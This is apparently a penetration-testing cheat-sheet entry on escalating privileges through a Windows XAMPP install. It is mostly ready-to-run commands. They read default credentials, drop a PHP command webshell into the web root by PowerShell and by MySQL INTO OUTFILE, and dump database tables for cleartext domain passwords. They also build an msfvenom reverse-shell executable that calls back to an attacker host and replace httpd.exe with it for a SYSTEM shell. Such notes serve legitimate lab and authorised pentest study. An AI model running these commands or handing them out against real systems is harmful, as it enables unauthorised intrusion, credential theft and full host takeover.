title: XAMPP — Discovery, Default Creds, and Privesc Paths
body:
XAMPP is a common Windows dev/lab stack bundling Apache, MySQL, PHP, and Perl under C:\xampp\. When found on a pentest target it almost always means MySQL root with no password and writable service binaries — both are immediate escalation paths.

XAMPP ships a passwords.txt file in C:\xampp\ that documents all default credentials. Check it first before doing anything else — it saves time.

The three privesc paths from XAMPP:
  1. MySQL root → INTO OUTFILE webshell (if Apache is running on a reachable port)
  2. MySQL root → database dump (look for a creds/users table with domain account passwords)
  3. Writable service binaries → DLL hijack or binary swap (Apache and MySQL both flagged by winPEAS as Authenticated Users writable)

For path 3: Apache service binary and its entire bin folder are writable by Authenticated Users. If the Apache service can be stopped and started (check with sc.exe query / Get-Service), drop a malicious httpd.exe and restart the service for SYSTEM.

For path 1: Apache must actually be running and listening. Verify with netstat before writing a webshell — do not assume it is running just because it is installed.
cmd:
# ══════════════════════════════════════════════════
# DETECT XAMPP
# ══════════════════════════════════════════════════
dir C:\xampp\ 2>nul
type C:\xampp\passwords.txt       # default creds for all services
type C:\xampp\readme_en.txt 2>nul  # version info

# ══════════════════════════════════════════════════
# CHECK SERVICE STATUS
# ══════════════════════════════════════════════════
Get-Service | Where-Object {$_.DisplayName -match 'apache|mysql|xampp'} | Select Name,DisplayName,Status
# Find real service names (Apache2.4 is WRONG — find the actual name):
sc.exe query type= all state= all | findstr /i -e 'apache' -e 'mysql'

# Check if we can control the service:
sc.exe query <ServiceName>     # get status
sc.exe stop  <ServiceName>     # try to stop
sc.exe start <ServiceName>     # try to start

# ══════════════════════════════════════════════════
# PATH 1 — MySQL → webshell (Apache must be running)
# ══════════════════════════════════════════════════
# Confirm Apache is listening:
netstat -ano | findstr 'LISTEN' | findstr ':80 \|:443 \|:8080'
# If listening:
[System.IO.File]::WriteAllText('C:\xampp\htdocs\cmd.php', '<?php system($_GET["cmd"]); ?>')
# Test from Kali:
curl 'http://<target>/cmd.php?cmd=whoami'
# Or via MySQL:
C:\xampp\mysql\bin\mysql.exe -u root -h 127.0.0.1 -P 3306 -e "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php';"
curl 'http://<target>/shell.php?cmd=whoami'

# ══════════════════════════════════════════════════
# PATH 2 — MySQL creds dump
# ══════════════════════════════════════════════════
C:\xampp\mysql\bin\mysql.exe -u root -h 127.0.0.1 -P 3306 -e "show databases;"
# Look for: creds, users, accounts, app, webapp — anything non-standard
C:\xampp\mysql\bin\mysql.exe -u root -h 127.0.0.1 -P 3306 -e "show tables;" "<interesting_db>"
C:\xampp\mysql\bin\mysql.exe -u root -h 127.0.0.1 -P 3306 -e "select * from creds;" "creds"
# Common find: domain account username and cleartext password

# ══════════════════════════════════════════════════
# PATH 3 — Writable service binary swap
# ══════════════════════════════════════════════════
# Confirm write access:
icacls C:\xampp\apache\bin\httpd.exe
# Look for: BUILTIN\Users or Authenticated Users with (W) or (F)

# Generate malicious binary on Kali:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=<port> -f exe -o httpd.exe
# Upload and replace:
upload httpd.exe C:\xampp\apache\bin\httpd.exe
sc.exe stop  <ApacheServiceName>
sc.exe start <ApacheServiceName>
# Shell catches as SYSTEM

# ══════════════════════════════════════════════════
# QUICKEST PATH — PowerShell file write (no MySQL needed)
# ══════════════════════════════════════════════════
# If Apache is running on any port, fastest webshell drop:
[System.IO.File]::WriteAllText('C:\xampp\htdocs\cmd.php', '<?php system($_GET["cmd"]); ?>')
# No escaping issues, no MySQL needed, works in any non-TTY shell
warn: Apache may be installed but not running — check netstat before trying webshell paths. The winPEAS DLL hijack warning for C:\xampp\apache\bin is real but the binary swap is cleaner and more reliable. If both Apache and MySQL services are stopped and you cannot restart them (access denied), fall back to credential pivoting from whatever the MySQL database contains — domain passwords found there are often the intended path.

choices.label: MySQL creds dump → found domain account
